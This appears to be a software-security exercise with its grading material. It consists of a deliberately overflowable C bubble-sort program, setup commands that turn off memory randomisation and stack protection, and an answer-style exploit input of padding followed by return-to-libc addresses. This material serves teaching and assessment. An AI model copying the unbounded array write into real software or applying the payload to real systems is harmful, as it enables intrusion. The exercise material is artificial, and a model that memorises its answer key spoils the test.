## Assumptions

### DSLR Disabled

> `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

###  Compilation

Compile vulnerable.c 

> `gcc sort.c -o sort -fno-stack-protector

### Operating System

> 32-bit  Ubuntu 14.04.03 LTS

## Problem

```C

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

long n = 0, c = 0, d = 0, swap = 0;
FILE *fp = NULL;

void bubble_sort()
{
  long array[10];
  // loading data to array
  printf("Source list:\n");
  char line[sizeof(long) * 2 + 1] = {0};
  
  while(fgets(line, sizeof(line), fp)) {
    if (strlen((char *)line) > 1) {
      sscanf(line, "%lx", &(array[n]));
      printf("0x%lx\n", array[n]);
      ++n;
    }
  }

  fclose(fp);
  // do bubble sorting
  for (c = 0 ; c < ( n - 1 ); c++)
  {
    for (d = 0 ; d < n - c - 1; d++)
    {
      if (array[d] > array[d+1])
      {
        swap       = array[d];
        array[d]   = array[d+1];
        array[d+1] = swap;
      }
    }
  }

  // output sorting result
  printf("\nSorted list in ascending order:\n");
  for ( c = 0 ; c < n ; c++ )
     printf("%lx\n", array[c]);
}

int main(int argc, char **argv)

{

    if(argc!=2)
    {
        printf("Usage: ./sort file_name\n");

        return -1;
    }

    fp = fopen(argv[1], "rb");

    bubble_sort();

    return 0;

}

```

## Identify Vulnerabilities

## Provide Remediation

## Grading Notes

- We choose 32-bit because it is MUCH easier for exploiting (on x86_64, attacker has to use return-oriented programming to load parameters from memory to registers

## Form of Exploit

```txt
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
AAAAAAAA
b7e56190
b7ecbbc4
b7f740f5
```

